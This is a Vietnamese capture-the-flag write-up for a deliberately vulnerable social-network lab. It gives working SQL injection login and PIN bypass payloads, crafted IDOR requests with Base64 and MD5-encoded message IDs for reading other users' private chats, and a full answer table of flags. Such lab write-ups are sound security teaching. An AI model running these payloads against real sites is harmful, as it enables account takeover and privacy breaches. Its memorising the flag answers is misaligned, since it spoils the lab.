# Fakebook Security Lab: writeup 7 flag với Burp Suite

Lab: `https://pharmacy-uniform-mega-consequence.trycloudflare.com/`

Writeup này dùng Burp Suite Community để ghi nhận và gửi lại request. Các bước xử lý Base64 và tính MD5 dùng [CyberChef](https://gchq.github.io/CyberChef/) theo yêu cầu. [HTTP history](https://portswigger.net/burp/documentation/desktop/tools/proxy/http-history) ghi lại request khi Intercept đang bật hoặc tắt; có thể gửi một request từ history sang Repeater để thử lại. [Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater) dùng để thay đổi tham số rồi gửi request lặp lại. CyberChef chạy các thao tác theo recipe; tìm thao tác trong ô **Operations**, nhập dữ liệu ở **Input**, rồi xem kết quả ở **Output** hoặc nhấn **Bake!**.

## Chuẩn bị Burp

1. Mở Burp Suite, vào **Proxy → Intercept → Open Browser** để dùng trình duyệt đã cấu hình proxy sẵn.
2. Truy cập URL lab. Có thể để **Intercept off** khi duyệt trang; request vẫn xuất hiện trong **Proxy → HTTP history**. Bật **Intercept on** khi muốn dừng và sửa request trước khi gửi.
3. Với các form đăng nhập và PIN bên dưới, nhập payload trực tiếp trong Burp Browser rồi gửi form. Chỉ chuyển request đọc tin nhắn sang Repeater để sửa query string. Giữ phiên đăng nhập khi mở các trang cần xác thực.
4. Trong Repeater, sửa phần body hoặc query string, nhấn **Send**, rồi đọc response ở khung bên phải. Burp thường tự cập nhật `Content-Length` khi sửa request.

Các thao tác trong Burp Browser vẫn xuất hiện ở **Proxy → HTTP history**, kể cả khi **Intercept off**. Khi cần Repeater, mở request trong history, nhấn chuột phải rồi chọn **Send to Repeater** để giữ cookie và header.

## Flag 1 — SQL injection ở đăng nhập

Trong Burp Browser, mở `/login.php`. Nhập payload vào ô tên đăng nhập và nhập tùy ý vào ô mật khẩu, sau đó bấm **Đăng nhập**:

```text
Tên đăng nhập: ' OR '1'='1' -- -
Mật khẩu: wrong
```

Burp sẽ ghi lại request `POST /login.php` trong HTTP history. Trình duyệt gửi các ký tự đặc biệt đã URL encode; body tương ứng là:

```text
action=login&username=%27+OR+%271%27%3D%271%27+--+-&password=wrong
```

Sau khi gửi form, response chuyển hướng đến `/wall.php`. Trang đó hiển thị flag:

```text
PATO{XOA_PUPG_CHUA?}
```

Payload làm điều kiện truy vấn SQL luôn đúng; `-- -` chú thích phần còn lại của câu truy vấn.

## Flag 2 — SQL injection ở PIN album

Sau khi đăng nhập bằng bước trước, mở `/album.php` trong Burp Browser. Nhập payload ngắn dưới đây vào ô PIN rồi bấm **Mở album**. Trường này giới hạn 9 ký tự:

```text
' OR 1#
```

Burp HTTP history sẽ ghi nhận request `POST /album.php`; body URL encoded tương ứng là:

```text
pin=%27+OR+1%23
```

Response mở album và phần **Debug SQL** cho thấy truy vấn được ghép trực tiếp với PIN. Flag:

```text
PATO{DINH_PHUONG_NAM}
```

Album còn tiết lộ tài khoản phụ `TranHaLinh123`; cần tên này ở Flag 7.

## Cách tìm request của bốn hội thoại

Mở `/wall.php`, sau đó lần lượt mở các hội thoại bị khóa. Trong **Proxy → HTTP history**, tìm các request `GET /post.php?action=list...` và `GET /post.php?action=read...` do trang chat gửi. Chuyển request `read` sang Repeater.

Request `list` cho biết `chat` và `user_id` của đối tác. Request `read` mặc định thiếu `user_id`; thêm giá trị đối tác vào request `read`. API kiểm tra ID tin nhắn nhưng không xác minh đúng quyền của người đang đăng nhập, tạo lỗi IDOR.

Các request dưới đây giả sử đã giữ cookie phiên đăng nhập hợp lệ:

## Flag 3 — IDOR trong hội thoại 1

Với `/chat.php?c=1`, đối tác có `user_id=2`. Trong Repeater gửi:

```http
GET /post.php?action=read&chat=1&id=2&user_id=2 HTTP/1.1
```

Response JSON chứa nội dung tin nhắn riêng và flag:

```text
PATO{GIAO_SU_CAO_LE_AB}
```

Ở hội thoại này ID tin nhắn là số nguyên thông thường. Thử ID `2` thay cho probe `1` trong request ban đầu.

## Flag 4 — IDOR với ID Base64 trong hội thoại 2

Với `/chat.php?c=2`, đối tác có `user_id=3`. Probe trên trang là `MDAwMDAx`. Mở CyberChef, nhập probe vào **Input**, tìm thao tác **From Base64** trong ô Operations và thêm vào recipe; **Output** là `000001`. Để tạo ID cần thử, xóa recipe cũ, nhập `000004`, tìm **To Base64** và thêm thao tác đó vào recipe:

```text
000004  →  MDAwMDA0
```

Trong Repeater gửi:

```http
GET /post.php?action=read&chat=2&id=MDAwMDA0&user_id=3 HTTP/1.1
```

Flag trong trường `content` của response:

```text
PATO{BE_CA_CHUA_DINH_XUAN_TRUNG}
```

## Flag 5 — IDOR với MD5 trong hội thoại 3

Với `/chat.php?c=3`, đối tác có `user_id=4`. ID tin nhắn `6` được gửi dưới dạng MD5. Mở CyberChef, nhập `6` vào **Input**, tìm thao tác **MD5** trong ô Operations và thêm vào recipe. **Output** là:

```text
1679091c5a880faf6fb5e6087eb1b2dc
```

Gửi request sau trong Repeater:

```http
GET /post.php?action=read&chat=3&id=1679091c5a880faf6fb5e6087eb1b2dc&user_id=4 HTTP/1.1
```

Flag:

```text
PATO{NU_HOANG_PCAP_DI_SOP}
```

MD5 là hash một chiều, nên CyberChef không thể giải mã ngược nó. Trong lab này cần thử các ID nhỏ có trong phạm vi dữ liệu mẫu rồi tính MD5 cho từng ứng viên.

## Flag 6 — IDOR với MD5 và `user_id` trong hội thoại 4

Với `/chat.php?c=4`, đối tác có `user_id=5`. Mã nguồn JavaScript `/static/js/chat.js` có comment gợi ý ID riêng là `8`; trang chat lại gửi một probe khác. Trong CyberChef, nhập `8`, thêm thao tác **MD5**, rồi lấy kết quả:

```text
8  →  c9f0f895fb98ab9159f51fd0297e236d
```

Sửa request `read`, thêm `user_id=5` lấy từ request `list`, rồi gửi:

```http
GET /post.php?action=read&chat=4&id=c9f0f895fb98ab9159f51fd0297e236d&user_id=5 HTTP/1.1
```

Flag:

```text
PATO{SIEU_CAP_LOLI_HUYNH_QUOC_THANG}
```

Đây là ví dụ rõ nhất về IDOR: đổi ID đối tượng và thêm ID đối tác vào request đã cho phép đọc tin riêng của tài khoản khác.

## Flag 7 — SQL injection ở đăng nhập tài khoản phụ

Mở `/nickphu.php` trong Burp Browser. Nhập tên tài khoản tìm được trong album:

```text
TranHaLinh123
```

Debug SQL trên trang cho thấy truy vấn đặt giá trị `password` trong dấu nháy kép. Nhập payload này vào ô mật khẩu rồi bấm **Đăng nhập**:

```text
" OR "1"="1" -- 
```

Burp HTTP history sẽ ghi request `POST /nickphu.php`; body URL encoded tương ứng là:

```text
username=TranHaLinh123&password=%22+OR+%221%22%3D%221%22+--+
```

Response báo đăng nhập thành công vào tài khoản phụ và hiển thị:

```text
PATO{FAN_ANH_DI}
```

Ở bước này cần dấu nháy kép để đóng chuỗi password theo đúng truy vấn hiển thị trong Debug SQL.

## Tổng hợp 7 flag

| # | Lỗ hổng | Flag |
|---|---|---|
| 1 | SQL injection đăng nhập | `PATO{XOA_PUPG_CHUA?}` |
| 2 | SQL injection PIN album | `PATO{DINH_PHUONG_NAM}` |
| 3 | IDOR hội thoại 1 | `PATO{GIAO_SU_CAO_LE_AB}` |
| 4 | IDOR hội thoại 2, ID Base64 | `PATO{BE_CA_CHUA_DINH_XUAN_TRUNG}` |
| 5 | IDOR hội thoại 3, ID MD5 | `PATO{NU_HOANG_PCAP_DI_SOP}` |
| 6 | IDOR hội thoại 4, ID MD5 | `PATO{SIEU_CAP_LOLI_HUYNH_QUOC_THANG}` |
| 7 | SQL injection đăng nhập tài khoản phụ | `PATO{FAN_ANH_DI}` |
